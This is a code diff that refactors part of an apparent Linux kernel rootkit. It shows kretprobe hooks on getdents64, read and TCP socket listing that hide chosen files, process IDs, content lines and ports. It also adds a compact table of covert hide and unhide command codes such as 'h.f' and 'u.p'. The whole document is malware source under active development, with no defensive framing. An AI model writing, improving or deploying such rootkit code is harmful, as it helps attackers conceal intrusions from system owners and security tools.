@@ -15,6 +15,7 @@
 #endif
 
 /* Getdents64 filter (files and PIDs) */
+
 struct getdents_data {
 	void __user *ubuf;
 	int fd;
@@ -22,11 +23,8 @@ struct getdents_data {
 
 static bool should_hide_dirent(const char *name)
 {
-	if (rk_target_match(&rk_file_targets, name))
-		return true;
-	if (rk_target_match(&rk_pid_targets, name))
-		return true;
-	return false;
+	return rk_target_match(&rk_file_targets, name) ||
+	       rk_target_match(&rk_pid_targets, name);
 }
 
 static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
@@ -99,6 +97,7 @@ struct kretprobe rk_getdents_probe = {
 };
 
 /* Read filter (content lines) */
+
 struct read_data {
 	void __user *ubuf;
 	size_t count;
@@ -181,6 +180,7 @@ struct kretprobe rk_read_probe = {
 };
 
 /* TCP seq_show filter (ports) */
+
 struct tcp_show_data {
 	struct seq_file *seq;
 	int saved_count;
@@ -237,78 +237,25 @@ struct kretprobe rk_tcp6_probe = {
 };
 
 /* Command handlers */
-static int cmd_hide_file(const char *arg)
-{
-	return rk_target_add(&rk_file_targets, arg);
-}
-static int cmd_hide_pid(const char *arg)
-{
-	return rk_target_add(&rk_pid_targets, arg);
-}
-static int cmd_hide_content(const char *arg)
-{
-	return rk_target_add(&rk_content_targets, arg);
-}
-static int cmd_hide_port(const char *arg)
-{
-	return rk_target_add(&rk_port_targets, arg);
-}
 
-static int cmd_unhide(struct rk_target_list *list, const char *arg)
-{
-	int idx;
+static int cmd_hide_file(const char *arg) { return rk_target_add(&rk_file_targets, arg); }
+static int cmd_hide_pid(const char *arg) { return rk_target_add(&rk_pid_targets, arg); }
+static int cmd_hide_content(const char *arg) { return rk_target_add(&rk_content_targets, arg); }
+static int cmd_hide_port(const char *arg) { return rk_target_add(&rk_port_targets, arg); }
 
-	if (!arg)
-		return -EINVAL;
-	if (kstrtoint(arg, 10, &idx) != 0)
-		return -EINVAL;
-	return rk_target_remove(list, idx);
-}
+static int cmd_unhide_file(const char *arg) { return rk_target_unhide(&rk_file_targets, arg); }
+static int cmd_unhide_pid(const char *arg) { return rk_target_unhide(&rk_pid_targets, arg); }
+static int cmd_unhide_content(const char *arg) { return rk_target_unhide(&rk_content_targets, arg); }
+static int cmd_unhide_port(const char *arg) { return rk_target_unhide(&rk_port_targets, arg); }
 
-static int cmd_unhide_file(const char *arg)
-{
-	return cmd_unhide(&rk_file_targets, arg);
-}
-static int cmd_unhide_pid(const char *arg)
-{
-	return cmd_unhide(&rk_pid_targets, arg);
-}
-static int cmd_unhide_content(const char *arg)
-{
-	return cmd_unhide(&rk_content_targets, arg);
-}
-static int cmd_unhide_port(const char *arg)
-{
-	return cmd_unhide(&rk_port_targets, arg);
-}
+static const struct rk_cmd_entry filter_cmds[] = {
+	{ "h.f", cmd_hide_file },      { "u.f", cmd_unhide_file },
+	{ "h.i", cmd_hide_pid },       { "u.i", cmd_unhide_pid },
+	{ "h.c", cmd_hide_content },   { "u.c", cmd_unhide_content },
+	{ "h.p", cmd_hide_port },      { "u.p", cmd_unhide_port },
+};
 
 int rk_filter_init(void)
 {
-	int ret;
-
-	ret = rk_cmd_register("h.f", cmd_hide_file);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("u.f", cmd_unhide_file);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("h.i", cmd_hide_pid);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("u.i", cmd_unhide_pid);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("h.c", cmd_hide_content);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("u.c", cmd_unhide_content);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("h.p", cmd_hide_port);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("u.p", cmd_unhide_port);
-	if (ret)
-		return ret;
-	return 0;
+	return rk_cmds_register(filter_cmds, ARRAY_SIZE(filter_cmds));
 }
